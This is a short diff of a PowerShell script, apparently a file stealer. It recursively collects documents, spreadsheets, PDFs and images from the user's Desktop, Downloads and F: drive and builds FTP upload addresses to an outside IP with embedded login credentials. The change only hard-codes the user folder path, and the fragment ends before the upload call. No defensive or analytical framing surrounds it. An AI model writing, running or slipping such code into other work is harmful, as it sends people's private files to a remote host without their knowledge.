@@ -1,5 +1,5 @@
 $web=New-Object System.Net.WebClient
-$Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads","F:\"
+$Dir = "C:\Users\user\desktop","C:\Users\user\Downloads","F:\"
 $FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
 foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.doc,*.xls*.pdf,*.pptx,*.docx,*.jpeg,*.jpg,*.png -Recurse)){
     $URI = New-Object System.Uri($FTP+$item.Name)
